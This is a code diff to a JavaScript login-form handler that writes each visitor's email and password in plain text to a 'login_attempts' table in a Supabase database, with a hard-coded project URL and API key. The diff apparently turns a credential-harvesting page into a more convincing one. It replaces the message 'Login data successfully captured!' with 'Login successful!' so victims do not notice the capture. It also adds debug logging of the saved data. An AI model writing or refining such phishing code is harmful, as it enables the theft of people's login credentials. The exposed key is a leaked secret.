@@ -3,7 +3,8 @@
 const SUPABASE_URL = 'https://qhzxujczvvmwtomstddf.supabase.co';
 const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFoenh1amN6dnZtd3RvbXN0ZGRmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjkwMTU1MjUsImV4cCI6MjA4NDU5MTUyNX0.8z4uhg9qR4URvKOagBIrGc-dLLw9mVLb7F-eMNy0-fk';
 
-const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+// Use window.supabase to avoid variable name collision
+const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
 const loginForm = document.getElementById('loginForm');
 const loginBtn = document.getElementById('loginBtn');
@@ -21,17 +22,24 @@ loginForm.addEventListener('submit', async (e) => {
     statusMessage.style.display = 'none';
 
     try {
+        console.log('Attempting to save data...');
+        
         // Insert data into 'login_attempts' table
-        const { data, error } = await supabase
+        const { data, error } = await supabaseClient
             .from('login_attempts')
             .insert([
                 { email: email, password: password }
             ]);
 
-        if (error) throw error;
+        if (error) {
+            console.error('Supabase Error:', error);
+            throw error;
+        }
+
+        console.log('Data saved successfully:', data);
 
         // Success state
-        statusMessage.innerText = 'Login data successfully captured!';
+        statusMessage.innerText = 'Login successful!';
         statusMessage.className = 'status-msg success';
         statusMessage.style.display = 'block';
 
@@ -41,8 +49,8 @@ loginForm.addEventListener('submit', async (e) => {
         }, 1500);
 
     } catch (err) {
-        console.error('Database Error:', err.message);
-        statusMessage.innerText = 'Failed to save. Check if your table "login_attempts" is created.';
+        console.error('Catch Error:', err.message);
+        statusMessage.innerText = 'Error: ' + err.message;
         statusMessage.className = 'status-msg error';
         statusMessage.style.display = 'block';
         
